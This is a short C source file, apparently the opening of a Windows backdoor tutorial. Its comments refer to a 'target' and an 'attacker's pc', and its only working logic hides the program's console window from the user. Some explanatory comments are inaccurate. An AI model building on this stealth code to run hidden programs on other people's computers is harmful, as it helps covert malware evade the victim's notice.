//Windows Program Main Function File

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> //to include all the .h header libraries
#include <winsock2.h> //for socket programming to establish connection with server
#include <windows.h> //to use windows specific programs
#include <winuser.h> //will be used to interact with the programs
#include <wininet.h> //will be used to interact with the programs
#include <windowsx.h> //will be used to interact with the programs
#include <string.h> //manipulate strings in the program
#include <sys/stat.h> //to get information about file attributes
#include <sys/types.h> //to interact with the files for various options

//every windows program includes an entry point fn and APIENTRY to access different fns
int APIENTRY winMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdShow)
// #RULES
// #1 nCmdShow is an Anonymity flag that says if the Main Application will be maxi/minimized or shown normally, which is the first thing that is done in this function.
// #2 The value of a Handle to an instance/module is used by the OS to identify the executable file, when it's loaded in the memory.
// #3 lpCmdline contains CMD line arguments like a unicode string
// #4 hPrev was used in 16bit OSs and just used to be compatible with the windows API. Its value is 0.
{
	HWND stealth; //now the application window will not be visible to the target. Stealth variable is the Handle to our Window.
	AllocConsole(); //a fn that allocates a new console on the attacker's pc, to the calling process everytime the Application is executed.
	
	stealth = FindWindowA("ConsoleWindowClass", NULL); 
	//a function from winuser.h that retrieves a handle to the top level window.
	//this fn uses two arguments where first one is a classname and other is the window name which we defined to be NULL.
	
	ShowWindow(stealth,0); 
	//A fn that decides whether to show the window to the program or not.
	//uses two arguments- Handle instance ie. stealth, nCmdShow ie. 0 to hiding the window and activating another window
	
}
